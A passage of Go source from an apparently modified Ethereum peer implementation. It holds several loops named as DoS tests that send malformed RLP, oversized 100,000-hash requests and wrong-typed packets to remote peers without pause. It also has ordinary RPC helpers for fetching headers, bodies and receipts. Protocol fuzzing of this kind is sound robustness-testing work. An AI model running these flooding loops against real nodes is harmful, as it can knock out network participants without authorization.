					return p2p.Send(p.rw, GetBlockBodiesMsg, packet)
				},
				// Extremely large request
				func() error {
					id := rand.Uint64()
					var hashes []common.Hash
					// Create a very large number of (potentially invalid) hashes
					for i := 0; i < 100000; i++ {
						hashes = append(hashes, common.Hash{})
					}
					packet := &GetBlockBodiesPacket{
						RequestId:             id,
						GetBlockBodiesRequest: hashes,
					}
					return p2p.Send(p.rw, GetBlockBodiesMsg, packet)
				},
				// Send raw malformed RLP
				func() error {
					invalidRLP := []byte{0xC0, 0x80, 0x81, 0x82} // Invalid RLP for this message
					return p2p.Send(p.rw, GetBlockBodiesMsg, rlp.RawValue(invalidRLP))
				},
			}

			scenario := scenarios[rand.Intn(len(scenarios))]
			if err := scenario(); err != nil {
				p.Log().Debug("Expected error in malformed get block bodies test:", "err", err)
			}
		}
	}
}

// MalformedGetReceiptsDoS sends get receipts requests with corrupted data
func (p *Peer) MalformedGetReceiptsDoS(stopCh <-chan struct{}) error {
	p.Log().Debug("Testing malformed get receipts")

	for {
		select {
		case <-stopCh:
			p.Log().Error("Stopping malformed get receipts test")
			return nil
		default:
			scenarios := []func() error{
				// Mixed invalid data types
				func() error {
					id := rand.Uint64()
					malformedRequest := struct {
						RequestId uint64
						Hashes    []interface{} // Mixed types instead of []common.Hash
					}{
						RequestId: id,
						Hashes: []interface{}{
							"string_hash",
							123456,
							[]byte{0x12, 0x34},
							nil,
							common.Hash{},
						},
					}
					return p2p.Send(p.rw, GetReceiptsMsg, malformedRequest)
				},
				// Invalid request ID patterns
				func() error {
					malformedPacket := struct {
						RequestId string `rlp:"raw"` // Wrong type for RequestId
						Hashes    []common.Hash
					}{
						RequestId: "invalid_id",
						Hashes:    []common.Hash{common.Hash{}},
					}
					return p2p.Send(p.rw, GetReceiptsMsg, malformedPacket)
				},
			}

			scenario := scenarios[rand.Intn(len(scenarios))]
			if err := scenario(); err != nil {
				p.Log().Debug("Expected error in malformed get receipts test:", "err", err)
			}
		}
	}
}

// MalformedPooledTransactionHashesDoS sends pooled transaction hash announcements with corrupted data
func (p *Peer) MalformedPooledTransactionHashesDoS(stopCh <-chan struct{}) error {
	p.Log().Debug("Testing malformed pooled transaction hashes")

	for {
		select {
		case <-stopCh:
			p.Log().Error("Stopping malformed pooled transaction hashes test")
			return nil
		default:
			scenarios := []func() error{
				// Mismatched array lengths
				func() error {
					packet := &NewPooledTransactionHashesPacket{
						Types:  []byte{0, 1, 2},                                                           // 3 elements
						Sizes:  []uint32{100, 200},                                                        // 2 elements
						Hashes: []common.Hash{common.Hash{}, common.Hash{}, common.Hash{}, common.Hash{}}, // 4 elements
					}
					return p2p.Send(p.rw, NewPooledTransactionHashesMsg, packet)
				},
				// Invalid transaction types
				func() error {
					packet := &NewPooledTransactionHashesPacket{
						Types:  []byte{255, 254, 253}, // Invalid transaction types
						Sizes:  []uint32{0, 0xFFFFFFFF, 0},
						Hashes: []common.Hash{common.Hash{}, common.Hash{}, common.Hash{}},
					}
					return p2p.Send(p.rw, NewPooledTransactionHashesMsg, packet)
				},
				// Wrong structure entirely
				func() error {
					malformedPacket := struct {
						InvalidField string
					}{"corrupted"}
					return p2p.Send(p.rw, NewPooledTransactionHashesMsg, malformedPacket)
				},
			}

			scenario := scenarios[rand.Intn(len(scenarios))]
			if err := scenario(); err != nil {
				p.Log().Debug("Expected error in malformed pooled transaction hashes test:", "err", err)
			}
		}
	}
}

// RPC版本: 通过RPC请求获取block headers
func (p *Peer) RequestHeadersByNumberRPC(origin uint64, amount int, skip int, reverse bool) error {
	p.Log().Debug("Requesting block headers via RPC", "origin", origin, "amount", amount, "skip", skip, "reverse", reverse)

	// 创建响应channel
	sink := make(chan *Response, 1)
	defer close(sink)

	// 调用原始的RequestHeadersByNumber函数
	req, err := p.RequestHeadersByNumber(origin, amount, skip, reverse, sink)
	if err != nil {
		p.Log().Error("Failed to request headers", "err", err)
		fmt.Printf("Error requesting headers: %v\n", err)
		return err
	}

	// 等待响应
	select {
	case resp := <-sink:
		// 打印结果
		if headers, ok := resp.Res.(*BlockHeadersRequest); ok {
			fmt.Printf("========== Received %d headers ==========\n", len(*headers))
			for i, header := range *headers {
				fmt.Printf("Header %d: Number=%s, Hash=%s, ParentHash=%s\n",
					i, header.Number.String(), header.Hash().Hex(), header.ParentHash.Hex())
			}
			fmt.Printf("========================================\n")
		}
		resp.Done <- nil
	case <-time.After(10 * time.Second):
		p.Log().Warn("Timeout waiting for headers response", "reqID", req.id)
		fmt.Printf("Timeout waiting for response\n")
	}

	return nil
}

// RPC版本: 通过RPC请求获取block bodies
func (p *Peer) RequestBodiesRPC(hashes []common.Hash) error {
	p.Log().Debug("Requesting block bodies via RPC", "count", len(hashes))

	// 创建响应channel
	sink := make(chan *Response, 1)
	defer close(sink)

	// 调用原始的RequestBodies函数
	req, err := p.RequestBodies(hashes, sink)
	if err != nil {
		p.Log().Error("Failed to request bodies", "err", err)
		fmt.Printf("Error requesting bodies: %v\n", err)
		return err
	}

	// 等待响应
	select {
	case resp := <-sink:
		// 打印结果
		if bodies, ok := resp.Res.(*BlockBodiesResponse); ok {
			fmt.Printf("========== Received %d bodies ==========\n", len(*bodies))
			for i, body := range *bodies {
				fmt.Printf("Body %d: Transactions=%d, Uncles=%d, Withdrawals=%d\n",
					i, len(body.Transactions), len(body.Uncles), len(body.Withdrawals))
			}
			fmt.Printf("========================================\n")
		}
		resp.Done <- nil
	case <-time.After(10 * time.Second):
		p.Log().Warn("Timeout waiting for bodies response", "reqID", req.id)
		fmt.Printf("Timeout waiting for response\n")
	}

	return nil
}

// RPC版本: 通过RPC请求获取receipts
func (p *Peer) RequestReceiptsRPC(hashes []common.Hash) error {
	p.Log().Debug("Requesting receipts via RPC", "count", len(hashes))

	// 创建响应channel
	sink := make(chan *Response, 1)
	defer close(sink)

	// 调用原始的RequestReceipts函数
	req, err := p.RequestReceipts(hashes, sink)
	if err != nil {
		p.Log().Error("Failed to request receipts", "err", err)
		fmt.Printf("Error requesting receipts: %v\n", err)
		return err
	}

	// 等待响应
	select {
	case resp := <-sink:
		// 打印结果
		if receipts, ok := resp.Res.(*ReceiptsResponse); ok {
			fmt.Printf("========== Received %d receipt sets ==========\n", len(*receipts))
			totalReceipts := 0
			for i, receiptSet := range *receipts {
				fmt.Printf("Receipt Set %d: %d receipts\n", i, len(receiptSet))
				totalReceipts += len(receiptSet)
				for j, receipt := range receiptSet {
					fmt.Printf("  Receipt %d: Status=%d, GasUsed=%d, CumulativeGasUsed=%d\n",
						j, receipt.Status, receipt.GasUsed, receipt.CumulativeGasUsed)
				}
			}
			fmt.Printf("Total receipts: %d\n", totalReceipts)
			fmt.Printf("==============================================\n")
		}
		resp.Done <- nil
	case <-time.After(10 * time.Second):
		p.Log().Warn("Timeout waiting for receipts response", "reqID", req.id)
		fmt.Printf("Timeout waiting for response\n")
	}

	return nil
}
